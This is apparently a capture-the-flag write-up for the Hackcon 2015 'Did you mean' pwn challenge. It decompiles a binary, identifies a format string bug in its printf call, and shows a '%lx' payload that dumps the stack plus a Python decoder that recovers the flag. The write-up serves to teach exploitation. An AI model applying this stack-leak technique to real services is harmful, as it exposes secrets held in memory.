---
layout: post
title:  "Hackcon 2015: Did you mean"
categories: hackcon2015
tags: pwn
date: 2015-08-20 19:00:00
---

> Category: *pwn* - Points: *50*
>
> Description: *Pwnie*

The task provides us with the file [`pwnie`]({{ site.url }}/assets/hackcon2015/pwnie) and an ip and address for a webservice.

    $ file pwnie
    pwnie: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b87bef02278df740b6c0011e989f39b08ccfc998, not stripped

Let's try to run it:

    $ ./pwnie
    No!

Ok, sorry. Let's check the output of `strings`. The only interesting ones are:

    flag.txt
    The flag's right!
    Did you say:

So it seems that the file `flag.txt` is involved. Let's create it with content: `ABCDEFGHIJKLMNOP` and run the program again. Now the program waits for our input and if we put again `ABCDEFGHIJKLMOP` this happens:

    $ ./pwnie
    ABCDEFGHIJKLMNOP
    The flag's right!

Ok, we have to produce some interesting payload, let's start IDA and decompile the `main`. We also added some comment in the code to highlight the important parts.

{% highlight c %}
...
  v3 = fopen("flag.txt", "r");
  if ( v3 )
  {
    fgets((char *)&v7, 100, v3);  // v7 is the content of v3 (flag.txt)
    fgets(&s, 100, stdin);        // s is the string from the stdin
    v4 = strncmp(&s, (const char *)&v7, 0xAuLL); 
    if ( v4 )   // if they do not match
    {
      v4 = 0;
      puts("Did you say: ");
      fflush(_bss_start);
      __printf_chk(1LL, &s);      // print the user input
      fflush(_bss_start);
    }
    else
    {
      puts("The flag's right!");  // the flag is correct
      fflush(_bss_start);
    }
  }
  else                            // the file does not exist
  {
    v4 = -1;
    puts("No!");
    fflush(_bss_start);
  }
  v5 = *MK_FP(__FS__, 40LL) ^ v9;
  return v4;
}
{% endhighlight %}

There is a *string format exploit* in the line:

    __printf_chk(1LL, &s);

The user input is treated as format string. So we can exploit this to dump the stack and get our flag. Since the program is in 64 bits we need to use the placeholder `%lx` to print a whole memory block. The `fgets` is told to copy 100 bytes, so we can join 33 times `%lx` in order to get more data from the stack.

    $ ./pwnie
    %lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx

The output is:

> 07f7ef00e68707f7ef05c374004847464544434241504f4e4d4c4b4a49a00007f7ef05e45207fff414a69807fff414a6970f63d4e2e40043625786c25ffffffff786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c25786c25786c257839cc7d2e1411990007f7ef001cec50

We can easily spot the part that holds the content of the file stored in little endian:

    4847464544434241504f4e4d4c4b4a49

So the interesting part comes after 26 bits. We can use python to convert the stack into readable data:

{% highlight python %}
data = "07f7ef00e68707f7ef05c374004847464544434241504f4e4d4c4b4a49a00007f7ef05e45207fff414a69807fff414a6970f63d4e2e40043625786c25ffffffff786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c25786c25786c257839cc7d2e1411990007f7ef001cec50"

for i in xrange(26, len(data), 16):
    print repr(data[i:i+16].decode('hex')[::-1])
{% endhighlight %}

The result is:

    'ABCDEFGH'
    'IJKLMNOP'
    'R\xe4\x05\xef\xf7\x07\x00\xa0'
    '\xff\x07\x98\xa6\x14\xf4\xff\x07'

We can use the same technique on the webservice and get the flag: `FORMAT(STR)`.

